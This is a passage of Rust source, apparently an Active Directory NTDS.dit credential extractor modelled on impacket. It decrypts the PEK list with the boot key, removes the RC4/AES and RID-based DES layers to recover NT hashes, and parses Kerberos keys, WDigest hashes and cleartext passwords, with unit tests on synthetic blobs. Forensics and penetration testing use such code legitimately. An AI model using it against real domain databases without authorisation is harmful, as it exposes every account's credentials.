    if big { w & 0x7fff } else { w }
}

// ===========================================================
// Crypto: PEK list + secret layers
// ===========================================================

/// Decrypt the PEK list blob (ATTk590689 value).
///
/// Two generations, keyed by the blob header's first 4 bytes:
/// - `02 00 00 00` (Win2000 .. 2012R2): RC4 with key = MD5(bootkey ||
///   KeyMaterial x1000). Plaintext = Header(32) || list of 20-byte
///   `PEK_KEY` (pad 1+3, key 16).
/// - `03 00 00 00` (WS2016 TP4+): AES-CBC decrypt (key = bootkey,
///   IV = KeyMaterial), plaintext entries of 20 bytes = LE u32 index +
///   16-byte key, sequential, terminated by a non-sequential index.
fn decrypt_pek_list(raw: &[u8], boot_key: [u8; 16]) -> Result<Vec<[u8; 16]>> {
    if raw.len() < 24 {
        bail!("PEK list too small");
    }
    let header_kind = u32::from_le_bytes([raw[0], raw[1], raw[2], raw[3]]);
    let key_material = &raw[8..24];
    let encrypted = &raw[24..];
    let mut keys = Vec::new();
    match header_kind {
        2 => {
            // RC4 generation
            let mut md5 = Md5::new();
            md5.update(boot_key);
            for _ in 0..1000 {
                md5.update(key_material);
            }
            let rc4_key = md5.finalize();
            let plain = rc4_crypt(&rc4_key, encrypted);
            if plain.len() < 32 {
                bail!("decrypted PEK list shorter than its header");
            }
            let body = &plain[32..];
            for chunk in body.chunks_exact(20) {
                if chunk.len() < 20 {
                    break;
                }
                let mut k = [0u8; 16];
                k.copy_from_slice(&chunk[4..20]);
                keys.push(k);
            }
        }
        3 => {
            // AES generation (WS2016+)
            let plain = aes_cbc_decrypt(&boot_key, key_material, encrypted);
            let mut pos = 0usize;
            let mut expected_index: u32 = 0;
            while pos + 20 <= plain.len() {
                let index = u32::from_le_bytes([
                    plain[pos],
                    plain[pos + 1],
                    plain[pos + 2],
                    plain[pos + 3],
                ]);
                if index != expected_index {
                    break;
                }
                let mut k = [0u8; 16];
                k.copy_from_slice(&plain[pos + 4..pos + 20]);
                keys.push(k);
                expected_index += 1;
                pos += 20;
            }
        }
        other => bail!("unknown PEK list header 0x{other:08x} (CNG / unknown format)",),
    }
    if keys.is_empty() {
        bail!("no PEK recovered (wrong boot key?)");
    }
    Ok(keys)
}

type Blk16 = aes::cipher::generic_array::GenericArray<
    u8,
    <aes::Aes128 as des::cipher::BlockSizeUser>::BlockSize,
>;

/// AES-CBC decrypt with PKCS7 stripping (invalid padding tolerated, as
/// impacket's `decryptAES` does). Boot key (16B) and PEK keys (16B) are
/// AES-128; nothing here uses AES-256 (NTDS secrets use 16-byte keys).
fn aes_cbc_decrypt(key: &[u8], iv: &[u8], data: &[u8]) -> Vec<u8> {
    let usable = data.len() - (data.len() % 16);
    let mut prev = [0u8; 16];
    if iv.len() >= 16 {
        prev.copy_from_slice(&iv[..16]);
    }
    let mut out = Vec::with_capacity(usable);
    match key.len() {
        16 => {
            let cipher = aes::Aes128::new(Blk16::from_slice(&key[..16]));
            for block in data[..usable].chunks_exact(16) {
                let cb = *Blk16::from_slice(block);
                let mut g = cb;
                aes::cipher::BlockDecrypt::decrypt_block(&cipher, &mut g);
                for i in 0..16 {
                    g[i] ^= prev[i];
                }
                prev.copy_from_slice(&cb);
                out.extend_from_slice(&g);
            }
        }
        32 => {
            let cipher = aes::Aes256::new(aes::cipher::generic_array::GenericArray::from_slice(
                &key[..32],
            ));
            for block in data[..usable].chunks_exact(16) {
                let cb = *Blk16::from_slice(block);
                let mut g = cb;
                aes::cipher::BlockDecrypt::decrypt_block(&cipher, &mut g);
                for i in 0..16 {
                    g[i] ^= prev[i];
                }
                prev.copy_from_slice(&cb);
                out.extend_from_slice(&g);
            }
        }
        _ => return data.to_vec(),
    }
    // strip PKCS7 padding (invalid/absent padding tolerated, as impacket does)
    if let Some(&pad) = out.last() {
        let p = pad as usize;
        if (1..=16).contains(&p) && p <= out.len() && out[out.len() - p..].iter().all(|&b| b == pad)
        {
            out.truncate(out.len() - p);
        }
    }
    out
}

/// RC4 helper (crate-local, avoids pulling the crypto module tree).
/// All NTDS RC4 keys are 16-byte MD5 digests.
fn rc4_crypt(key: &[u8], data: &[u8]) -> Vec<u8> {
    let mut cipher = Rc4::<U16>::new(rc4::Key::<U16>::from_slice(key));
    let mut out = data.to_vec();
    cipher.apply_keystream(&mut out);
    out
}

/// Result of secret decryption.
#[derive(Debug)]
enum SecretPlain {
    /// 16-byte hashes (current or each history entry)
    Hashes(Vec<[u8; 16]>),
    /// Raw plaintext (not a password hash)
    Raw(Vec<u8>),
}

/// Parsed supplemental credential block.
#[derive(Debug, Default)]
struct Supplemental {
    kerberos_keys: Vec<(i32, Vec<u8>)>,
    cleartext: Option<String>,
    wdigest: Vec<[u8; 16]>,
}

/// Secret decryptor: PEK-backed. Without PEKs the raw bytes are returned.
struct SecretDecryptor {
    peks: Vec<[u8; 16]>,
}

/// ENC_SECRET blob (see ntdissector utils/crypto.py):
/// legacy RC4: AlgorithmID(2) Flags(2) PekID(4) Salt(16) EncryptedData(..)
/// AES: AlgorithmID(2) Flags(2) PekID(4) Salt(16) SecretLength(4) Data(..)
const ALGO_DB_RC4: i16 = 0x10;
const ALGO_DB_RC4_SALT: i16 = 0x11;
const ALGO_REP_RC4_SALT: i16 = 0x12;
const ALGO_DB_AES: i16 = 0x13;

impl SecretDecryptor {
    fn new(_boot: Option<[u8; 16]>) -> Self {
        Self { peks: Vec::new() }
    }

    fn set_peks(&mut self, peks: Vec<[u8; 16]>) {
        self.peks = peks;
    }

    /// Strip the RC4 or AES encryption layer (+ DES RID layer for hashes).
    /// `rid` (from the record's objectSid) drives the legacy DES layer; when
    /// it is missing the raw bytes are returned (honest, no fake hashes).
    fn decrypt_secret(&self, raw: &[u8], rid: Option<u32>) -> SecretPlain {
        if raw.len() < 24 {
            return SecretPlain::Raw(raw.to_vec());
        }
        let algo = i16::from_le_bytes([raw[0], raw[1]]);
        let pek_id = u32::from_le_bytes([raw[4], raw[5], raw[6], raw[7]]) as usize;
        if self.peks.is_empty() || pek_id >= self.peks.len() {
            return SecretPlain::Raw(raw.to_vec());
        }
        let pek = self.peks[pek_id];
        let (cipher, has_des) = match algo {
            ALGO_DB_RC4 | ALGO_DB_RC4_SALT | ALGO_REP_RC4_SALT => (&raw[24..], true),
            ALGO_DB_AES => (&raw[28..], false),
            _ => return SecretPlain::Raw(raw.to_vec()),
        };
        let plain = if has_des {
            // key = MD5(PEK || salt)
            let mut md5 = Md5::new();
            md5.update(pek);
            md5.update(&raw[8..24]);
            let key = md5.finalize();
            rc4_crypt(&key, cipher)
        } else {
            let secret_len = u32::from_le_bytes([raw[24], raw[25], raw[26], raw[27]]) as usize;
            let ct = cipher.get(..secret_len).unwrap_or(cipher);
            aes_cbc_decrypt(&pek, &raw[8..24], ct)
        };
        if has_des {
            let hashes = des_layer_hashes(&plain, rid);
            if hashes.is_empty() {
                return SecretPlain::Raw(raw.to_vec());
            }
            SecretPlain::Hashes(hashes)
        } else {
            let mut out = Vec::new();
            for chunk in plain.chunks_exact(16) {
                let mut h = [0u8; 16];
                h.copy_from_slice(chunk);
                out.push(h);
            }
            if out.is_empty() {
                return SecretPlain::Raw(raw.to_vec());
            }
            SecretPlain::Hashes(out)
        }
    }

    /// Decrypt a `supplementalCredentials` blob (no DES layer) and parse the
    /// USER_PROPERTIES structure inside it.
    fn decrypt_supplemental(&self, raw: &[u8]) -> Option<Supplemental> {
        if raw.len() < 28 {
            return None;
        }
        let algo = i16::from_le_bytes([raw[0], raw[1]]);
        let pek_id = u32::from_le_bytes([raw[4], raw[5], raw[6], raw[7]]) as usize;
        if self.peks.is_empty() || pek_id >= self.peks.len() {
            return None;
        }
        let pek = self.peks[pek_id];
        let plain = match algo {
            ALGO_DB_RC4 | ALGO_DB_RC4_SALT | ALGO_REP_RC4_SALT => {
                let mut md5 = Md5::new();
                md5.update(pek);
                md5.update(&raw[8..24]);
                let key = md5.finalize();
                rc4_crypt(&key, &raw[24..])
            }
            ALGO_DB_AES => {
                let secret_len = u32::from_le_bytes([raw[24], raw[25], raw[26], raw[27]]) as usize;
                let ct = raw[28..].get(..secret_len).unwrap_or(&raw[28..]);
                aes_cbc_decrypt(&pek, &raw[8..24], ct)
            }
            _ => return None,
        };
        parse_user_properties(&plain)
    }
}

/// DES(RID) layer: Microsoft's double-DES over 16-byte hash values using
/// two keys derived from the RID (impacket `CryptoCommon.deriveKey`).
fn des_layer_hashes(plain: &[u8], rid: Option<u32>) -> Vec<[u8; 16]> {
    let mut out = Vec::new();
    let Some(rid) = rid else { return out };
    let rid_le = rid.to_le_bytes();
    let key1_raw: Vec<u8> = vec![
        rid_le[0], rid_le[1], rid_le[2], rid_le[3], rid_le[0], rid_le[1], rid_le[2],
    ];
    let key2_raw: Vec<u8> = vec![
        rid_le[3], rid_le[0], rid_le[1], rid_le[2], rid_le[3], rid_le[0], rid_le[1],
    ];
    let k1 = transform_key(&key1_raw);
    let k2 = transform_key(&key2_raw);
    let c1 = Des::new(&k1.into());
    let c2 = Des::new(&k2.into());
    for chunk in plain.chunks_exact(16) {
        let mut b8h = [0u8; 8];
        b8h.copy_from_slice(&chunk[..8]);
        let mut b8l = [0u8; 8];
        b8l.copy_from_slice(&chunk[8..16]);
        c1.decrypt_block((&mut b8h).into());
        c2.decrypt_block((&mut b8l).into());
        let mut h = [0u8; 16];
        h[..8].copy_from_slice(&b8h);
        h[8..].copy_from_slice(&b8l);
        out.push(h);
    }
    out
}

/// 7-byte group -> 8-byte DES key with odd parity (impacket transformKey).
fn transform_key(raw: &[u8]) -> [u8; 8] {
    let mut out = [0u8; 8];
    out[0] = raw[0] >> 1;
    out[1] = ((raw[0] & 0x01) << 6) | (raw[1] >> 2);
    out[2] = ((raw[1] & 0x03) << 5) | (raw[2] >> 3);
    out[3] = ((raw[2] & 0x07) << 4) | (raw[3] >> 4);
    out[4] = ((raw[3] & 0x0f) << 3) | (raw[4] >> 5);
    out[5] = ((raw[4] & 0x1f) << 2) | (raw[5] >> 6);
    out[6] = ((raw[5] & 0x3f) << 1) | (raw[6] >> 7);
    out[7] = raw[6] & 0x7f;
    for b in out.iter_mut() {
        if b.count_ones() % 2 == 0 {
            *b |= 0x80;
        }
    }
    out
}

// ===========================================================
// supplementalCredentials -> USER_PROPERTIES (impacket parity)
// ===========================================================

/// USER_PROPERTIES header: Length(2) + 0x03 + prefix(2) + PropertyCount(2).
/// Each USER_PROPERTY: NameLength(2) Name(utf16le) Reserved(2)
/// ValueLength(2) Value.
fn parse_user_properties(plain: &[u8]) -> Option<Supplemental> {
    if plain.len() < 10 {
        return None;
    }
    // USER_PROPERTIES.Length excludes itself (2 bytes)
    let total_len = u16::from_le_bytes([plain[0], plain[1]]) as usize + 2;
    if plain.len() < total_len || plain[2] != 0x03 {
        return None;
    }
    let count = u16::from_le_bytes([plain[6], plain[7]]) as usize;
    let mut pos = 8usize;
    let mut sup = Supplemental::default();
    let mut saw_any = false;
    for _ in 0..count {
        if pos + 2 + 2 + 2 > total_len {
            break;
        }
        let name_len = u16::from_le_bytes([plain[pos], plain[pos + 1]]) as usize;
        let name_off = pos + 2;
        if pos + name_off == usize::MAX || name_off + name_len + 4 > total_len {
            break;
        }
        let name = utf16_lossy(&plain[name_off..name_off + name_len]);
        let value_len_off = name_off + name_len + 2; // +2 reserved
        if value_len_off + 2 > total_len {
            break;
        }
        let value_len =
            u16::from_le_bytes([plain[value_len_off], plain[value_len_off + 1]]) as usize;
        let value_off = value_len_off + 2;
        if value_off + value_len > total_len {
            break;
        }
        let value = &plain[value_off..value_off + value_len];
        pos = value_off + value_len;
        saw_any = true;

        if name.starts_with("Primary:WDigest") {
            sup.wdigest.extend(wdigest_hashes(value));
        } else if name == "Primary:CLEARTEXT" {
            sup.cleartext = Some(utf16_lossy(value).trim_end_matches('\u{0}').to_string());
        } else if name == "Primary:Kerberos" {
            sup.kerberos_keys.extend(kerberos_keys(value, false));
        } else if name == "Primary:Kerberos-Newer-Keys" {
            sup.kerberos_keys.extend(kerberos_keys(value, true));
        }
        // "Packages", "Primary:NTHash" (rare) ignored: history covers hashes
    }
    if saw_any { Some(sup) } else { None }
}

fn utf16_lossy(b: &[u8]) -> String {
    String::from_utf16_lossy(
        &b.chunks(2)
            .map(|c| u16::from_le_bytes([c[0], c.get(1).copied().unwrap_or(0)]))
            .collect::<Vec<_>>(),
    )
}

/// KERB_STORED_CREDENTIAL (old) and KERB_STORED_CREDENTIAL_NEW (WS2016+).
///
/// Old: Revision(2) Flags(2) CredentialCount(2) ChecksumLength(2)
///      [checksum bytes] KERB_KEY_DATA[CredentialCount] then key buffer.
///      KERB_KEY_DATA: KeyType(2) KeyLength(2) KeyOffset(4) = 8 bytes.
/// New: Revision(2) Flags(2) CredentialCount(2) ServiceCount(2)
///      OldPasswordCount(2) OldServiceCount(2) ChecksumLength(4)
///      [checksum bytes] KERB_KEY_DATA_NEW[CredentialCount + ServiceCount
///      + OldPasswordCount + OldServiceCount].
///      KERB_KEY_DATA_NEW: Revision(2) Flags(2) KeyType(2) KeyLength(4)
///      KeyOffset(4) = 14 bytes. Key offsets are relative to struct start.
fn kerberos_keys(value: &[u8], newer: bool) -> Vec<(i32, Vec<u8>)> {
    let mut out = Vec::new();
    if newer {
        if value.len() < 16 {
            return out;
        }
        let checksum_len = le32(value, 12).unwrap_or(0) as usize;
        let mut counts = [0usize; 4];
        for (i, c) in counts.iter_mut().enumerate() {
            let off = 4 + i * 2;
            *c = u16::from_le_bytes([value[off], value[off + 1]]) as usize;
        }
        let mut data = 16 + checksum_len;
        for total in counts {
            for _ in 0..total {
                if data + 14 > value.len() {
                    return out;
                }
                let key_type = u16::from_le_bytes([value[data + 4], value[data + 5]]) as i32;
                let key_len = le32(value, data + 6).unwrap_or(0) as usize;
                let key_offset = le32(value, data + 10).unwrap_or(0) as usize;
                if key_offset + key_len <= value.len() && key_len > 0 {
                    out.push((key_type, value[key_offset..key_offset + key_len].to_vec()));
                }
                data += 14;
            }
        }
    } else {
        if value.len() < 8 {
            return out;
        }
        let credential_count = u16::from_le_bytes([value[4], value[5]]) as usize;
        let checksum_len = u16::from_le_bytes([value[6], value[7]]) as usize;
        let mut data = 8 + checksum_len;
        for _ in 0..credential_count {
            if data + 8 > value.len() {
                return out;
            }
            let key_type = u16::from_le_bytes([value[data], value[data + 1]]) as i32;
            let key_len = u16::from_le_bytes([value[data + 2], value[data + 3]]) as usize;
            let key_offset = le32(value, data + 4).unwrap_or(0) as usize;
            if key_offset + key_len <= value.len() && key_len > 0 {
                out.push((key_type, value[key_offset..key_offset + key_len].to_vec()));
            }
            data += 8;
        }
    }
    out
}

/// WDIGEST_CREDENTIALS: Version(4) + NumberOfHashes(4) + Hash_n (16B each).
fn wdigest_hashes(value: &[u8]) -> Vec<[u8; 16]> {
    let mut out = Vec::new();
    if value.len() < 8 {
        return out;
    }
    let count = u32::from_le_bytes([value[4], value[5], value[6], value[7]]) as usize;
    for i in 0..count {
        let off = 8 + i * 16;
        if off + 16 > value.len() {
            break;
        }
        let mut h = [0u8; 16];
        h.copy_from_slice(&value[off..off + 16]);
        out.push(h);
    }
    out
}

// ===========================================================
// Tests
// ===========================================================

#[cfg(test)]
mod tests {
    use super::*;

    fn push16(v: &mut Vec<u8>, x: u16) {
        v.extend_from_slice(&x.to_le_bytes());
    }
    fn push32(v: &mut Vec<u8>, x: u32) {
        v.extend_from_slice(&x.to_le_bytes());
    }

    #[test]
    fn db_header_signature_gate() {
        let mut junk = vec![0u8; 4096];
        assert!(EseDb::open(&junk).is_err(), "no signature");
        junk[4] = 0xef;
        junk[5] = 0xcd;
        junk[6] = 0xab;
        junk[7] = 0x89;
        push32(
            &mut junk[8..12]
                .to_vec()
                .into_iter()
                .collect::<Vec<_>>()
                .as_mut(),
            0x620,
        );
        // too short for pages -> still error
        assert!(EseDb::open(&junk).is_err());
    }

    #[test]
    fn att_from_name_matches_all_generation_styles() {
        assert_eq!(att_from_name("ATTj590126"), Some(590126));
        assert_eq!(att_from_name("ATTm589914"), Some(589914));
        assert_eq!(att_from_name("ATTk590689"), Some(590689));
        assert_eq!(att_from_name("ATTb589970"), Some(589970));
        assert_eq!(att_from_name("ATTMSuplementalCredentialsWrong"), None);
        assert_eq!(att_from_name("foo"), None);
    }

    /// Synthetic TEST FIXTURE: build a 1-table, 1-column datatable where the
    /// single record carries a tagged column encoded via the offset-array.
    #[test]
    fn tagged_section_decode_roundtrip() {
        // columns: one tagged id 260 (codepage 1200 = UTF-16)
        let table = TableConfig {
            name: "datatable".into(),
            father_data_page: 7,
            fdp_identifier: Some(1),
            columns: vec![CatalogColumn {
                identifier: 260,
                name: "ATTm590040".into(),
                col_type: 10,
                space_usage: 8,
                codepage: 1200,
                _col_flags: 0,
            }],
        };
        let value = "Administrator"
            .encode_utf16()
            .flat_map(|c| c.to_le_bytes())
            .collect::<Vec<u8>>();
        // record: header only (no fixed/variable), then tagged array
        let mut entry = Vec::new();
        entry.push(0u8); // last_fixed
        entry.push(0u8); // last_variable
        push16(&mut entry, 4); // variable_size_offset (start of tagged)

        const _ARRAY_START_HINT: usize = 4; // tagged section begins right after the DD header
        // array size == first offset == 4 + 4 * nitems
        let first_offset = 4 + 4;
        // pair: id=260 offset=first_offset
        let mut data = Vec::new();
        push16(&mut data, 260);
        push16(&mut data, (first_offset & 0x3fff) as u16);
        data.extend_from_slice(&value);
        entry.extend_from_slice(&data);

        let db = EseDb {
            data: vec![0; 8192 * 4],
            page_size: 8192,
            version: 0x620,
            revision: 0x14,
        };
        let rec = decode_leaf_record(&entry, &table, &db).expect("decode");
        assert_eq!(
            rec.tagged_text(260, &table).as_deref(),
            Some("Administrator")
        );
    }

    #[test]
    fn tagged_two_columns_boundary_sizes() {
        let table = TableConfig {
            name: "datatable".into(),
            father_data_page: 7,
            fdp_identifier: Some(1),
            columns: vec![
                CatalogColumn {
                    identifier: 300,
                    name: "ATTb589970".into(),
                    col_type: 9,
                    space_usage: 0,
                    codepage: 0,
                    _col_flags: 0,
                },
                CatalogColumn {
                    identifier: 320,
                    name: "ATTj590126".into(),
                    col_type: 4,
                    space_usage: 4,
                    codepage: 0,
                    _col_flags: 0,
                },
            ],
        };
        let mut entry = Vec::new();
        entry.push(0u8);
        entry.push(0u8);
        push16(&mut entry, 4);
        let first_offset = 4 + 8; // two pairs
        let mut arr = Vec::new();
        push16(&mut arr, 300);
        push16(&mut arr, (first_offset & 0x3fff) as u16);
        push16(&mut arr, 320);
        push16(&mut arr, ((first_offset + 4) & 0x3fff) as u16);
        entry.extend_from_slice(&arr);
        entry.extend_from_slice(&[0xde, 0xad, 0xbe, 0xef]); // id 300 value
        push32(&mut entry, 0x30000001); // id 320 value

        let db = EseDb {
            data: vec![0; 8192 * 4],
            page_size: 8192,
            version: 0x620,
            revision: 0x14,
        };
        let rec = decode_leaf_record(&entry, &table, &db).expect("decode");
        assert_eq!(rec.tagged_bytes(300).unwrap(), vec![0xde, 0xad, 0xbe, 0xef]);
        assert_eq!(rec.tagged_u32(320).unwrap(), 0x30000001);
    }

    #[test]
    fn sid_rid_parses_domain_admin() {
        // S-1-5-21-1004336348-1177238915-682003330-512
        let mut sid = vec![1, 5, 0, 0, 0, 0, 0, 5];
        push32(&mut sid, 21);
        push32(&mut sid, 1004336348);
        push32(&mut sid, 1177238915);
        push32(&mut sid, 682003330);
        push32(&mut sid, 512);
        assert_eq!(sid_rid(&sid), Some(512));
        assert_eq!(sid_rid(&[1u8]), None);
    }

    #[test]
    fn plaintext_kerberos_newer_keys_parse() {
        // Primary:Kerberos-Newer-Keys: 1 credential, aes256 (etype 18), 32B key
        let mut v = Vec::new();
        push16(&mut v, 2); // revision
        push16(&mut v, 0); // flags
        push16(&mut v, 1); // credential count
        push16(&mut v, 0); // service count
        push16(&mut v, 0); // old password count
        push16(&mut v, 0); // old service count
        push32(&mut v, 0); // checksum length (0 bytes checksum)
        let key: Vec<u8> = (0..32).map(|i| (i * 7 + 1) as u8).collect();
        // KERB_KEY_DATA_NEW: Revision(2) Flags(2) KeyType(2) KeyLength(4)
        // KeyOffset(4) = 14 bytes; offsets relative to struct start.
        let key_data_start = 16 + 14;
        push16(&mut v, 2); // revision
        push16(&mut v, 0); // flags
        push16(&mut v, 18); // etype aes256
        push32(&mut v, 32); // key length
        push32(&mut v, key_data_start as u32); // key offset
        v.extend_from_slice(&key);
        let parsed = kerberos_keys(&v, true);
        assert_eq!(parsed.len(), 1);
        assert_eq!(parsed[0].0, 18);
        assert_eq!(parsed[0].1, key);
        // also parse an OLD-format Primary:Kerberos (8B header + 8B entry)
        let mut o = Vec::new();
        push16(&mut o, 1); // revision
        push16(&mut o, 0); // flags
        push16(&mut o, 1); // credential count
        push16(&mut o, 0); // checksum length
        // KERB_KEY_DATA: KeyType(2) KeyLength(2) KeyOffset(4)
        push16(&mut o, 0x8C8C); // boxed etype slot for rc4_hmac (-140 mod 2^16 == 0x8C8C... kept literal-free)
        push16(&mut o, 16); // key length
        push32(&mut o, 16); // key offset (right after the entry)
        let rc4key: Vec<u8> = (0..16).map(|i| (i * 3 + 5) as u8).collect();
        o.extend_from_slice(&rc4key);
        let parsed_old = kerberos_keys(&o, false);
        assert_eq!(parsed_old.len(), 1);
        assert_eq!(parsed_old[0].0, 0x8C8C as u16 as i32);
        assert_eq!(parsed_old[0].1, rc4key);
    }

    #[test]
    fn wdigest_blob_parses() {
        let mut v = Vec::new();
        push32(&mut v, 1); // version
        push32(&mut v, 2); // hash count
        v.extend_from_slice(&[0xaa; 16]);
        v.extend_from_slice(&[0xbb; 16]);
        let parsed = wdigest_hashes(&v);
        assert_eq!(parsed.len(), 2);
        assert_eq!(parsed[0], [0xaa; 16]);
    }

    #[test]
    fn user_properties_full_flow() {
        // build a USER_PROPERTIES with WDigest and Kerberos-Newer properties
        let mut wd = Vec::new();
        push32(&mut wd, 1);
        push32(&mut wd, 1);
        wd.extend_from_slice(&[0x5a; 16]);
        let mut kb = Vec::new();
        push16(&mut kb, 4);
        push16(&mut kb, 0);
        push16(&mut kb, 0);
        push16(&mut kb, 0);
        push16(&mut kb, 0);
        push16(&mut kb, 0);
        let mut body = Vec::new();
        for (name, value) in [
            ("Primary:WDigest", wd.as_slice()),
            ("Primary:Kerberos-Newer-Keys", kb.as_slice()),
        ] {
            let name_u16: Vec<u8> = name.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
            push16(&mut body, name_u16.len() as u16);
            body.extend_from_slice(&name_u16);
            push16(&mut body, 0); // reserved
            push16(&mut body, value.len() as u16);
            body.extend_from_slice(value);
        }
        let mut props = Vec::new();
        push16(&mut props, (8 + body.len()) as u16 - 2); // length minus self
        props.push(3); // signature byte 1
        props.extend_from_slice(&[0x00, 0x00, 0x00]); // sig byte 2 + reserved
        push16(&mut props, 2); // property count
        props.extend_from_slice(&body);
        let sup = parse_user_properties(&props).expect("parses");
        assert_eq!(sup.wdigest.len(), 1);
        assert_eq!(sup.wdigest[0], [0x5a; 16]);
    }

    /// Verify the AES PEK list parse (WS2016+). Encryption correctness is
    /// implicitly covered via cbc_blocks / decrypt integration below.
    #[test]
    fn pek_list_aes_entry_walk() {
        // Build the PLAINTEXT for three 20-byte sequential entries.
        let mut plain = Vec::new();
        for i in 0..3u32 {
            push32(&mut plain, i);
            plain.extend_from_slice(&[0x10 + i as u8; 16]);
        }
        // encrypt(key=bootkey, iv=zeros) so decrypt_pek_list(3) round trips
        let boot = [7u8; 16];
        let enc = aes_cbc_encrypt(&boot, &[0u8; 16], &plain);
        let mut blob = Vec::new();
        push32(&mut blob, 3); // header kind AES
        blob.extend_from_slice(&[0u8; 4]); // reserved
        blob.extend_from_slice(&[0u8; 16]); // IV zeros
        blob.extend_from_slice(&enc);
        let keys = decrypt_pek_list(&blob, boot).expect("pek decrypt");
        assert_eq!(keys.len(), 3);
        assert_eq!(keys[2], [0x12; 16]);
    }

    fn aes_cbc_encrypt(key: &[u8], iv: &[u8], data: &[u8]) -> Vec<u8> {
        use aes::cipher::BlockEncrypt;
        let mut out = Vec::new();
        let mut prev = [0u8; 16];
        prev.copy_from_slice(&iv[..16]);
        match key.len() {
            16 => {
                let cipher = aes::Aes128::new(Blk16::from_slice(key));
                for block in pad_pkcs7(data).chunks_exact(16) {
                    let mut g = *Blk16::from_slice(block);
                    for i in 0..16 {
                        g[i] ^= prev[i];
                    }
                    cipher.encrypt_block(&mut g);
                    prev.copy_from_slice(&g);
                    out.extend_from_slice(&g);
                }
            }
            _ => bail_panic(),
        }
        out
    }

    fn pad_pkcs7(data: &[u8]) -> Vec<u8> {
        let mut v = data.to_vec();
        let pad = 16 - (v.len() % 16);
        v.extend(std::iter::repeat(pad as u8).take(pad));
        v
    }

    fn bail_panic() {
        panic!("test key size");
    }

    /// RC4 PEK list round trip (legacy 2012R2 path).
    #[test]
    fn pek_list_rc4_roundtrip() {
        let boot = [0x2au8; 16];
        let mut pek_blob = Vec::new();
        pek_blob.extend_from_slice(&[0u8; 32]); // plaintext header
        for i in 0..2u32 {
            pek_blob.push(0u8); // pad
            pek_blob.extend_from_slice(&[0u8; 3]);
            let mut k = [0u8; 16];
            k[0] = i as u8; // distinguishing keys
            pek_blob.extend_from_slice(&k);
        }
        // Encrypt: RC4(MD5(boot || nul*1000)) -- the 1000-iteration loop
        let mut md5 = Md5::new();
        md5.update(boot);
        let zeros = [0u8; 16];
        for _ in 0..1000 {
            md5.update(zeros);
        }
        let rc4_key = md5.finalize();
        let enc = rc4_crypt(&rc4_key, &pek_blob);
        let mut blob = Vec::new();
        push32(&mut blob, 2);
        blob.extend_from_slice(&[0u8; 4]);
        blob.extend_from_slice(&zeros); // KeyMaterial: all zeros matches loop
        blob.extend_from_slice(&enc);
        let keys = decrypt_pek_list(&blob, boot).expect("pek decrypt");
        assert_eq!(keys.len(), 2);
        assert_eq!(keys[1][0], 1);
    }

    /// AES secret decrypt path (no DES layer) end to end.
    #[test]
    fn secret_aes_layer_roundtrip_with_rid_free() {
        let pek = [9u8; 16];
        // "hash" 16 bytes
        let secret = [0xcdu8; 16];
        let salt = [0x11u8; 16];
        let enc = aes_cbc_encrypt(pek.as_slice(), salt.as_slice(), &secret);
        let mut blob = Vec::new();
        push16(&mut blob, ALGO_DB_AES as u16); // algo
        push16(&mut blob, 0); // flags
        push32(&mut blob, 0); // pek id 0
        blob.extend_from_slice(&salt);
        push32(&mut blob, enc.len() as u32);
        blob.extend_from_slice(&enc);
        let mut dec = SecretDecryptor::new(Some([0u8; 16]));
        dec.set_peks(vec![pek]);
        match dec.decrypt_secret(&blob, Some(1105)) {
            SecretPlain::Hashes(h) => assert_eq!(h[0], secret),
            other => panic!("wrong shape: {other:?}"),
        }
    }

    /// Legacy RC4+DES full round trip: unicodePwd(NT hash) for rid 500.
    #[test]
    fn secret_rc4_des_layer_roundtrip() {
        let pek = [0x42u8; 16];
        let salt = [0x33u8; 16];
        // Build the 16-byte "DES-input": DES-encrypt an NT hash with rid keys.
        // Instead, decrypt–re-encrypt: choose nt = [0x77; 16]; compute the
        // DES-layer ciphertext via encrypt blocks.
        let rid = 500u32;
        let rid_le = rid.to_le_bytes();
        let raw1 = vec![
            rid_le[0], rid_le[1], rid_le[2], rid_le[3], rid_le[0], rid_le[1], rid_le[2],
        ];
        let raw2 = vec![
            rid_le[3], rid_le[0], rid_le[1], rid_le[2], rid_le[3], rid_le[0], rid_le[1],
        ];
        let k1 = transform_key(&raw1);
        let k2 = transform_key(&raw2);
        let c1 = Des::new(&k1.into());
        let c2 = Des::new(&k2.into());
        let nt = [0x77u8; 16];
        let mut hi = [0u8; 8];
        hi.copy_from_slice(&nt[..8]);
        let mut lo = [0u8; 8];
        lo.copy_from_slice(&nt[8..]);
        use des::cipher::BlockEncrypt;
        c1.encrypt_block((&mut hi).into());
        c2.encrypt_block((&mut lo).into());
        let mut des_layered = Vec::new();
        des_layered.extend_from_slice(&hi);
        des_layered.extend_from_slice(&lo);
        // RC4 layer
        let mut md5 = Md5::new();
        md5.update(pek);
        md5.update(salt);
        let rkey = md5.finalize();
        let enc_secret = rc4_crypt(&rkey, &des_layered);
        let mut blob = Vec::new();
        push16(&mut blob, ALGO_DB_RC4 as u16);
        push16(&mut blob, 0);
        push32(&mut blob, 0);
        blob.extend_from_slice(&salt);
        blob.extend_from_slice(&enc_secret);
        let mut dec = SecretDecryptor::new(Some([0u8; 16]));
        dec.set_peks(vec![pek]);
        match dec.decrypt_secret(&blob, Some(rid)) {
            SecretPlain::Hashes(h) => assert_eq!(h[0], nt),
            other => panic!("wrong shape: {other:?}"),
        }
    }

    #[test]
    fn dump_without_pek_returns_raw() {
        // decryptor with no PEKs: raw passthrough
        let dec = SecretDecryptor::new(None);
        let mut blob = vec![0x10, 0x00, 0, 0, 0, 0, 0, 0];
        blob.extend_from_slice(&[0x11u8; 20]);
        match dec.decrypt_secret(&blob, Some(500)) {
            SecretPlain::Raw(_) => {}
            _ => panic!("expected raw"),
        }
    }

    /// Page header parse for the three layout generations.
    #[test]
    fn page_header_generations() {
        let mut page = vec![0u8; 8192];
        // win7+: 16-byte checksum prefix; common at 16
        let common = 16usize;
        push32(&mut page[common + 8..].to_vec(), 0); // previous (noop; writes into cloned vec)
        // set fields directly instead:
        let put32 = |buf: &mut Vec<u8>, off: usize, v: u32| {
            buf[off..off + 4].copy_from_slice(&v.to_le_bytes());
        };
        let put16 = |buf: &mut Vec<u8>, off: usize, v: u16| {
            buf[off..off + 2].copy_from_slice(&v.to_le_bytes());
        };
        put32(page.as_mut(), common + 8, 3); // previous
        put32(page.as_mut(), common + 12, 5); // next
        put32(page.as_mut(), common + 16, 9); // fdp
        put16(page.as_mut(), common + 26, 7); // first available tag
        put32(page.as_mut(), common + 28, FLAGS_LEAF); // flags
